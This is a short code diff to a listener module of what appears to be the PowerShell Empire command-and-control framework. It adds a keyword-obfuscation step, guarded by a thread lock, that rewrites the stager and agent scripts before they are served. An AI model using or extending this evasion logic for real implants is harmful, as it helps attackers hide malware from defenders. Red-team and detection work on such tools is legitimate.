@@ -6,6 +6,7 @@ import random
 import copy
 import os
 import hashlib
+import threading
 
 # Empire imports
 from lib.common import helpers
@@ -368,6 +369,12 @@ class Listener(object):
             stager = f.read()
             f.close()
 
+            # Get the random function name generated at install and patch the stager with the proper function name
+            conn = self.get_db_connection()
+            self.lock.acquire()
+            stager = helpers.keyword_obfuscation(stager, conn)
+            self.lock.release()
+
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
@@ -476,6 +483,12 @@ class Listener(object):
             f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
             code = f.read()
             f.close()
+
+            # Get the random function name generated at install and patch the stager with the proper function name
+            conn = self.get_db_connection()
+            self.lock.acquire()
+            code = helpers.keyword_obfuscation(code, conn)
+            self.lock.release()
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
